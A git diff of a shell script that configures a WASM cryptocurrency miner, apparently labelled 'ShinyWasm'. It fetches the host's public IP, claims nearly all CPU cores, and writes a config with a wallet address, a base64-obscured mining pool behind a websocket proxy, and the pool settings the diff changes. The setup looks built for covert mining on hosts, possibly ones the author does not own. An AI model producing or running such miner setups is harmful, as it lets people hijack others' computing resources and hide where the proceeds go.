@@ -15,7 +15,7 @@ done
 currentdate=$(date '+%d-%b-%Y_ShinyWasm_')
 ipaddress=$(curl -s api.ipify.org)
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
-used_num_of_cores=`expr $num_of_cores - 4`
+used_num_of_cores=`expr $num_of_cores - 3`
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 underscore="_"
 underscored_ip+=$underscore
@@ -38,9 +38,9 @@ sleep 2
 
 cat > data.json <<END
 {
-  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Y29pbnhwLnRlYXRzcHJheS51azo4MjQz",
+  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:9999/bWF6YXBvb2wubXJmYWNlLmNvbTo4NDQy",
   "config": { "threads": $used_num_of_cores, "log": true },
-  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate", "password": "c=MAZA,m=solo", "argent": "web-wasm/1.0" }
+  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate", "password": "x", "argent": "web-wasm/1.0" }
 }
 END
 
